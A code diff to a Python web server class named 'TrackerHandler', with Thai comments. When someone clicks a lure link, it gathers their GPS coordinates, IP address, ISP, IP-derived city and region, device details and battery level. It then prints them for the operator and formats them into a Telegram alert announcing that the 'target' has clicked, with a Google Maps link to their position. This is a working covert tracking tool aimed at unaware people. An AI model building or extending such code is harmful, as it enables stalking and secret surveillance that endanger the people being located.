@@ -68,25 +68,43 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             now = datetime.now(tz_th)
             dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
             
+            # ดึงข้อมูล IP และ แบตเตอรี่
+            ip_info = device_info.get('ip', {})
+            battery_info = device_info.get('battery', {})
+            
+            # จัดฟอร์แมตข้อมูลแบตเตอรี่
+            bat_text = "ไม่ทราบ"
+            if battery_info:
+                status = "⚡ กำลังชาร์จ" if battery_info.get('charging') else "🔋 ไม่ได้ชาร์จ"
+                bat_text = f"{battery_info.get('level', 0)}% ({status})"
+
             print('\n========================================')
             print('🚨 มีคนกดลิ้งค์และส่งข้อมูลมาแล้ว! 🚨')
             print(f'🕒 วันและเวลา: {dt_string}')
+            print(f'🌐 IP Address: {ip_info.get("ip", "N/A")}')
+            print(f'🏢 เครือข่าย (ISP): {ip_info.get("org", "N/A")}')
+            print(f'📍 พื้นที่ (IP Location): {ip_info.get("city", "N/A")}, {ip_info.get("region", "N/A")}, {ip_info.get("country_name", "N/A")}')
             print(f'📍 ละติจูด (Latitude): {lat}')
             print(f'📍 ลองจิจูด (Longitude): {lon}')
             print(f'📱 อุปกรณ์ (User Agent): {device_info.get("userAgent", "N/A")}')
             print(f'⚙️ ระบบ (Platform): {device_info.get("platform", "N/A")} | ภาษา: {device_info.get("language", "N/A")}')
             print(f'🖥️ ขนาดหน้าจอ: {device_info.get("screen", "N/A")}')
             print(f'🚀 CPU Cores: {device_info.get("cores", "N/A")} | RAM: {device_info.get("ram", "N/A")} GB')
-            print(f'🌐 ลิ้งค์ Google Maps เพื่อดูแผนที่:')
+            print(f'🔋 แบตเตอรี่: {bat_text}')
+            print(f'🗺️ ลิ้งค์ Google Maps เพื่อดูแผนที่:')
             print(f'https://www.google.com/maps?q={lat},{lon}')
+            
             # สร้างข้อความสำหรับส่งเข้า Telegram
             tg_message = (
                 f"🚨 เป้าหมายกดลิงก์แล้ว!\n\n"
                 f"🕒 เวลา: {dt_string}\n"
-                f"📍 พิกัด: {lat}, {lon}\n"
+                f"🌐 IP: {ip_info.get('ip', 'N/A')}\n"
+                f"🏢 เครือข่าย: {ip_info.get('org', 'N/A')}\n"
+                f"📍 พื้นที่ (จาก IP): {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}\n"
+                f"📍 พิกัด GPS: {lat}, {lon}\n"
                 f"📱 อุปกรณ์: {device_info.get('platform', 'N/A')}\n"
-                f"🚀 CPU: {device_info.get('cores', 'N/A')} cores\n"
-                f"🖥 หน้าจอ: {device_info.get('screen', 'N/A')}\n\n"
+                f"🔋 แบตเตอรี่: {bat_text}\n"
+                f"🚀 CPU: {device_info.get('cores', 'N/A')} cores\n\n"
                 f"🌐 Google Maps:\nhttps://www.google.com/maps?q={lat},{lon}"
             )
             
